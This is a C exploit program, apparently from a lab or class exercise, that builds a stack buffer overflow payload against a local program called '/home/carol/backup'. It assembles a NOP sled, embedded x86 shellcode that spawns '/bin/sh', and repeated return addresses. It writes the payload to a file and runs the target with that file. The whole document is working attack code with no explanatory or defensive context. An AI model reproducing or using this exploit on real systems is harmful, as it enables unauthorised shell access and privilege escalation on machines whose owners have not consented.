#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

static char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90"
  "\x90\x90"
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh"
  "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
   "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
;


int main(){


   FILE *fp;
   char *arg[4];
   char *env[1];
   int i=0;
   char addr[] = "\x9c\xdd\xbf\xff";
   char op[2048 + 4096] = "";
   long address = 0xffbfd5f0;
   char nop[] = "\x90";
   char mode[] = "0777";
   int p;
   arg[0] = "/home/carol/backup";
   arg[1] = "backup";
   arg[2] = "foo1";
   arg[3] = NULL;
   env[0] = NULL;

/*0xffbfdd9c*/

   for(i=0; i< 2048  - strlen(shellcode); i= i+strlen("\x90")){
       strcat(op,nop);
   }
   strcat(op,shellcode);

   for(i=0; i< 125; i = i + sizeof(address)){
       strcat(op,addr);
   }


   fp = fopen("./foo1","w+");
   fprintf(fp,"%s",op);

   fclose(fp);

   p = strtol(mode,0,8);
   if(chmod("./foo1",p) < 0){
      fprintf(stderr, "chmod failed.\n");
   }


   if( execve(arg[0],arg,env))
           fprintf(stderr, "execve failed.\n");

   exit(0);

return 0;
}
                               
